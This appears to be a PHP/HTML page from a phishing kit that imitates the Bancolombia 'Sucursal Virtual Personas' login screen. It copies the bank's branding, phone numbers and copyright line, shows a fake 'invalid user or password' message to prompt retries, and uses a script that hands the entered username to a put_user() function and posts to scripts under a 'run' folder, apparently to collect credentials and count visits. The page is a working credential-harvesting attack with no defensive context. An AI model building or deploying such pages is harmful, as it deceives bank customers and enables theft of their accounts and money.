<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = date("%A, %d de %B de %Y", strtotime('2010-01-08'));
date_default_timezone_set('America/Bogota');
?>
<html>

<head>
	<title>Bancolombia Sucursal Vrtual Personas</title>
	<meta http-equiv="content-type" content="text/html; utf-8">
	<meta charset="utf-8">
	<meta content="es" http-equiv="Content-Language">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link href="../../../../../src/css/layout.css" rel="stylesheet">
	<link href="../../../../../src/css/fonts.css" rel="stylesheet">
	<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
</head>

<body>
	<div class="contenido">
		<div class="cabecera">
			<div class="logo">
				<img src="../../../../../src/img/logo.svg">
				<br>
				<span class="subtitulo">Sucursal Virtual Personas</span>
				<br>
				<span class="texto-min">Fecha y hora actual:</span> <span class="texto-min" id="fecha-hora">Lunes 13 de
					Junio de 2022 9:23:11 AM</span>
			</div>
			<div class="titulo">Inciar sesion</div>
			<div class="mensaje" id="err-mensaje">
				<table>
					<tr>
						<td valign="middle"><img src="../../../../../src/img/error.jpg" style="width: 40px;"></td>
						<td valign="middle" style="padding-left: 12px;"><span
								style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor
								ingesar la información requerida.</span></td>
					</tr>
				</table>
			</div>
			<div class="mensaje" id="alt-mensaje" style="display: <?php echo $caso; ?>;">
				<table>
					<tr>
						<td valign="middle"><img src="../../../../../src/img/error.jpg" style="width: 40px;"></td>
						<td valign="middle" style="padding-left: 12px;"><span
								style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Usuario o
								clave inválida. Por favor intente de nuevo.</span></td>
					</tr>
				</table>
			</div>
		</div>
		<div class="cuerpo">
			<div class="pnlizq">
				<div class="formulario">
					<div class="form-titulo">Usuario</div>
					<div class="descripcion">
						Si no tienes un usuario asignado ingresa con tu documento de identidad
					</div>
					<div class="form-cuerpo">
						<div style="text-align: left;">
							<img src="../../../../../src/img/info.jpg" class="icon-info"><span
								class="etiqueta">Ingresa tu usuario</span>
						</div>
						<div class="input-icono user">
							<input type="text" name="inp-user" id="inp-user" autocomplete="off">
						</div>
						<br>
						<button id="btn-user" name="btn-user" class="btn btn-amarillo" type="button">Continuar</button>
						<br>
						<div class="texto" style="text-align: right;">
							<div class="vinculos">
								<a href="#">¿Olvidaste tu usuario?</a>
							</div>
							<div class="vinculos">
								<a href="#">¿Problemas para conectarte?</a>
							</div>
						</div>
					</div>
				</div>
				<br>
				<div class="lista-links ">
					<div class="texto">
						<div class="vinculos">
							<table>
								<tr>
									<td valign="middle"><img src="../../../../../src/img/demo.jpg"></td>
									<td valign="middle"><a href="#">Conoce sobre sucursal virtual persona</a></td>
								</tr>
							</table>
						</div>
						<div class="vinculos">
							<table>
								<tr>
									<td valign="middle"><img src="../../../../../src/img/seguridad.jpg"></td>
									<td valign="middle"><a href="#">Aprende sobre Seguridad</a></td>
								</tr>
							</table>
						</div>
						<div class="vinculos">
							<table>
								<tr>
									<td valign="middle"><img src="../../../../../src/img/reglamento.jpg"></td>
									<td valign="middle"><a href="#">Reglamento Sucursal Virtual</a></td>
								</tr>
							</table>
						</div>
						<div class="vinculos">
							<table>
								<tr>
									<td valign="middle"><img src="../../../../../src/img/politica.jpg"></td>
									<td valign="middle"><a href="#">Política de Privacidad</a></td>
								</tr>
							</table>
						</div>
					</div>
				</div>
			</div>
			<div class="pnlder">
				<a href="#"><img src="../../../../../src/img/inicio.png" class="publicidad"
						style="max-width: 627px;"></a><br><br>
				<div class="texto" style="text-align:center;">¿No conoces la Sucursal Virtual Personas de Bancolombia?
					Mira el DEMO</div>
			</div>
		</div>
		<div class="pie">
			<div class="direccion">Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505
				- Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213<br
					class="salto-pie">
				El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados
				Unidos 1866 379 9714.</div>
			<div class="ippie">
				<span class="dirip">Dirección IP:
					<?php echo $ip; ?>
				</span>´
				<span class="copyright">Copyright © 2022 Bancolombia S.A.</span>
			</div>
		</div>
	</div>

	<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
	<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
	<script type="text/javascript" src="../../../../../src/js/run.js"></script>

	
	<script type="text/javascript">
    	$(document).ready(function () {
    
    		$.post("../../../../../run/caso-usuario.php", function (data) {
    			if (data == "1") {
    				$("#alt-mensaje").show();
    			} else {
    				$("#alt-mensaje").hide();
    				$.post("../../../../../run/contador.php", function (data) {
    
    				});
    			}
    		});
    
    		$('#btn-user').click(function () {
    			if ($("#inp-user").val().length > 0) {
    				put_user($("#inp-user").val());
    			} else {
    				$("#err-mensaje").show();
    				$(".user").css("border", "1px solid red");
    				$("#inp-user").focus();
    			}
    		});
    
    		$("#inp-user").keyup(function (e) {
    			$(".user").css("border", "1px solid #CCCCCC");
    			$("#err-mensaje").hide();
    		});
    	});
    </script>
    <script type="text/javascript">
    	$(function ($) {
    		var optionsEST = {
    			am_pm: true,
    			timeNotation: '12h',
    			h_hour: "<?php echo date('H:i:s') ?>",
    			h_date: "<?php echo date('Y/m/d') ?>",
    			h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
    			h_language: "es"
    		}
    		$('#fecha-hora').jclock(optionsEST);
    	});
    </script>
</body>

</html>